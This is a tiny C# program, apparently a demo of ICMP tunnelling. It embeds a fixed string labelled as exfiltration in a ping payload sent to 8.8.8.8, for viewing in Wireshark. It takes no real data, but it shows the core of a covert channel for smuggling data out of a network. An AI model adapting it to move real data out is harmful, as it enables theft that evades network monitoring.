using System;
using System.Net.NetworkInformation;
using System.Text;

namespace ICMPTunnel
{
    class Program
    {
        static void Main(string[] args)
        {
            Byte[] message = Encoding.ASCII.GetBytes("ICMP Tunnel Exfiltration");
            Ping packet = new Ping();
            packet.Send("8.8.8.8", 32, message);
            // Use wireshark to see the message in the packet.
        }
    }
}
